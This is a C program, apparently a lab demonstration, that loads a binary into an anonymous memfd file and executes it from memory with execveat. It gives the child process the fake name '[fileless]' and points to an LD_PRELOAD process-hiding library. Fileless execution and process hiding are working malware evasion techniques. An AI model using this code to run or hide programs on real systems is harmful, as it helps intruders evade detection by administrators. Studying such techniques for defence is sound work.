#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <string.h>

/* execveat syscall wrapper */
#ifndef SYS_execveat
#define SYS_execveat 322  /* x86_64 */
#endif

#define AT_EMPTY_PATH 0x1000

int execveat(int dirfd, const char *pathname, char *const argv[],
             char *const envp[], int flags) {
	return syscall(SYS_execveat, dirfd, pathname, argv, envp, flags);
}

int main(int argc, char *argv[], char *envp[]) {
	if (argc < 2) {
		fprintf(stderr, "Usage: %s <binary> [args...]\n", argv[0]);
		fprintf(stderr, "Example: %s ./simple_payload arg1 arg2\n", argv[0]);
		return 1;
	}

	const char *binary_path = argv[1];

	/* Step 1: Read binary into memory */
	printf("[*] Reading binary: %s\n", binary_path);
	FILE *f = fopen(binary_path, "rb");
	if (!f) {
		perror("fopen");
		return 1;
	}

	fseek(f, 0, SEEK_END);
	long size = ftell(f);
	fseek(f, 0, SEEK_SET);

	printf("[*] Binary size: %ld bytes\n", size);

	char *buf = malloc(size);
	if (!buf) {
		perror("malloc");
		fclose(f);
		return 1;
	}

	if (fread(buf, 1, size, f) != (size_t)size) {
		perror("fread");
		free(buf);
		fclose(f);
		return 1;
	}
	fclose(f);

	/* Step 2: Create anonymous memory file */
	printf("[*] Creating anonymous memory file (memfd_create)...\n");
	int memfd = memfd_create("", MFD_CLOEXEC);
	if (memfd < 0) {
		perror("memfd_create");
		free(buf);
		return 1;
	}

	printf("[*] Memory file descriptor: %d\n", memfd);

	/* Step 3: Write binary to memory file */
	printf("[*] Writing binary to memory...\n");
	if (write(memfd, buf, size) != (ssize_t)size) {
		perror("write");
		free(buf);
		close(memfd);
		return 1;
	}

	printf("[*] ✓ Binary loaded into memory (no disk file created)\n");
	free(buf);

	/* Step 4: Execute via execveat with AT_EMPTY_PATH */
	printf("[*] Executing from memory (execveat)...\n");
	printf("[*] Child process should display its PID\n");
	printf("[*] Try: ps aux | grep %s\n", argv[1]);
	printf("[*] Then: HIDE_PIDS=<PID> LD_PRELOAD=../preload/libprocessHider.so ps aux\n");
	printf("\n");

	/* Build argv for child process */
	/* argv[0] should be the "name" of the executable */
	char **child_argv = malloc((argc - 1) * sizeof(char *));
	if (!child_argv) {
		perror("malloc");
		close(memfd);
		return 1;
	}

	child_argv[0] = "[fileless]";  /* Fake process name */
	for (int i = 2; i < argc; i++) {
		child_argv[i - 1] = argv[i];
	}
	child_argv[argc - 2] = NULL;

	/* Execute from memory file */
	execveat(memfd, "", child_argv, envp, AT_EMPTY_PATH);

	/* execveat doesn't return on success */
	perror("execveat");
	free(child_argv);
	close(memfd);
	return 1;
}
